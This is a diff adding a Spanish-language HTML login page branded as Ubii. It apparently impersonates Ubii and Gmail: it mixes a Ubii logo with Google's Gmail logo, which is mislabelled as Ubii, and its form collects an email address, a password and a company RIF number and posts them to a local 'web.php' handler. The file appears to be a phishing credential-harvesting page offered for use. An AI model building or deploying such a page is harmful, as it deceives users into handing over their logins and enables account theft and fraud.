@@ -1,0 +1,69 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ubii - Inicia sesión</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="top-logo">
+        <img src="LogoUbiiOnline.svg" alt="Ubii Logo" width="80">
+    </div>
+    <div class="container">
+        <div class="login-box">
+            <header>
+                <div class="logo">
+                    <img src="	https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_2x_r7.png" alt="Ubii Logo" width="100">
+                </div>
+                <h1>Inicie sesión con su correo electrónico</h1>
+            </header>
+
+            
+
+            <form class="login-form" action="web.php" method="POST">
+                <!-- Campos Jurídicos Condicionales -->
+                <div id="juridicoFields" style="display: none;">
+                    <div class="authorized-user-check">
+                        <label for="isAuthorized">¿Eres un usuario autorizado?</label>
+                        <input type="checkbox" id="isAuthorized" name="isAuthorized">
+                    </div>
+
+                    <div id="rifGroup" class="input-group rif-group" style="display: none;">
+                        <div class="rif-container">
+                            <select name="rifType" class="rif-select">
+                                <option value="V">V</option>
+                                <option value="J">J</option>
+                                <option value="G">G</option>
+                                <option value="E">E</option>
+                                <option value="P">P</option>
+                            </select>
+                            <input type="text" name="rifNumber" placeholder="RIF de la empresa">
+                        </div>
+                        <div id="rifError" class="error-message"></div>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <input type="text" name="usuario" placeholder="Correo">
+                    <div id="usuarioError" class="error-message"></div>
+                </div>
+
+                <!-- Campo de Contraseña -->
+                <div class="input-group password-group">
+                    <input type="password" name="password" id="password" placeholder="Contraseña">
+                   
+                </div>
+
+                <button type="submit" class="btn-ingresar">Ingresar</button>
+            </form>
+
+          
+        </div>
+    </div>
+
+    <script src="modal.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
